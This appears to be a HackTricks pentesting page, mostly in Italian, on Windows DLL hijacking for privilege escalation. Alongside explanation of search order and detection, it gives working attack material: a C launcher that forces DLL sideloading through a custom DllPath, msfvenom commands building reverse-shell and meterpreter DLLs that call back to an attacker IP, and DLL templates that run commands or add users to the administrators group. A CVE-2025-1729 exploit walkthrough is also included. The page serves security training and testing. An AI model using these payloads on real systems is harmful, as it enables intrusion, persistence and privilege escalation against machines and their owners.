# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione fidata affinché carichi una DLL malevola. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, ottenere persistence e, meno frequentemente, privilege escalation. Nonostante qui ci si concentri sull'escalation, il metodo di hijacking rimane coerente rispetto all'obiettivo.

### Tecniche comuni

Sono impiegati diversi metodi per il DLL hijacking, ciascuno con l'efficacia variabile a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una malevola, opzionalmente usando DLL Proxying per preservare la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: Inserire la DLL malevola in un percorso di ricerca che precede quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione caricherà, pensando sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una versione malevola nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, simile alle tecniche di Binary Proxy Execution.

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo la **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **dll mancante in un eseguibile specifico** dovresti impostare **un altro filtro tipo "Process Name" "contains" "\<exec name>", eseguirlo e interrompere la cattura degli eventi**.

## Sfruttare Dll mancanti

Per poter effettuare privilege escalation, la nostra miglior opportunità è poter **scrivere una dll che un processo privilegiato cercherà di caricare** in alcuni dei percorsi in cui verrà cercata. Pertanto, saremo in grado di **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella contenente la **dll originale** (caso atipico), oppure saremo in grado di **scrivere in una cartella dove la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Ordine di ricerca delle Dll

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le DLL vengono caricate nello specifico.**

Le applicazioni Windows cercano le DLL seguendo una serie di percorsi di ricerca predefiniti, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando una DLL dannosa è posizionata strategicamente in una di queste directory, assicurandosi di essere caricata prima della DLL autentica. Una soluzione per evitare questo è far sì che l'applicazione utilizzi percorsi assoluti quando si riferisce alle DLL di cui ha bisogno.

Di seguito puoi vedere l'ordine di ricerca delle DLL su sistemi a 32-bit:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Quello è l'ordine di ricerca **di default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la current directory sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll può essere caricata indicando il path assoluto invece che solo il nome**. In quel caso la dll verrà **cercata solo in quel percorso** (se la dll ha dipendenze, queste verranno cercate come se la dll fosse stata appena caricata per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo una directory controllata dall'attaccante qui, un processo target che risolve una DLL importata per nome (nessun path assoluto e senza usare i flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.

Idea chiave
- Costruire i process parameters con RtlCreateProcessParametersEx e fornire un DllPath personalizzato che punti alla cartella controllata (es. la directory dove risiede il tuo dropper/unpacker).
- Creare il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la risoluzione, permettendo uno sideloading affidabile anche quando la DLL malevola non è colocata con l'EXE target.

Note/limitazioni
- Questo influenza il processo figlio che viene creato; è diverso da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o chiamare LoadLibrary per una DLL usando il nome (nessun path assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e path assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono cambiare la precedenza.

Esempio minimo in C (ntdll, wide strings, gestione errori semplificata):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Sì, i requisiti sono complicati da trovare perché **di default è piuttosto raro trovare un eseguibile privilegiato a cui manca una dll** ed è ancora **più raro avere i permessi di scrittura su una cartella del system path** (di norma non li hai). Tuttavia, in ambienti mal configurati ciò è possibile.\
Se per fortuna trovi una situazione che soddisfa i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di a Dll hijaking per la versione di Windows che ti interessa (probabilmente cambiando solo il percorso della cartella su cui hai i permessi di scrittura).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifica i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche verificare gli imports di un eseguibile e gli exports di una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking to escalate privileges** con i permessi di scrittura in una **System Path folder** consulta:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualsiasi cartella all'interno di system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso trovassi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Nota comunque che Dll Hijacking è utile per [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **how to create a valid dll** all'interno di questo studio su dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **basic dll codes** che potrebbero essere utili come **templates** o per creare una **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll capace di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come **expected** inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la library** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il proprio

Nota che, in diversi casi, la Dll che compili deve **export several functions** che verranno caricate dal processo vittima. Se queste funzioni non esistono, il **binary won't be able to load** le stesse e l'**exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita giornalmente alle 9:30 AM nel contesto dell'utente connesso.
- **Permessi della directory**: scrivibile da `CREATOR OWNER`, permettendo agli utenti locali di posizionare file arbitrari.
- **Comportamento di ricerca delle DLL**: tenta di caricare `hostfxr.dll` dalla sua directory di lavoro per prima e registra "NAME NOT FOUND" se è assente, indicando la precedenza della ricerca nella directory locale.

### Exploit Implementation

Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL dannosa viene eseguita nella sessione dell'amministratore a medium integrity.
4. Concatenare tecniche standard di UAC bypass per elevare i privilegi da medium integrity a privilegi SYSTEM.

### Mitigazione

Lenovo ha rilasciato la versione UWP **1.12.54.0** tramite il Microsoft Store, che installa TPQMAssistant in `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, rimuove l'attività pianificata vulnerabile e disinstalla i componenti Win32 legacy.

## Riferimenti

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
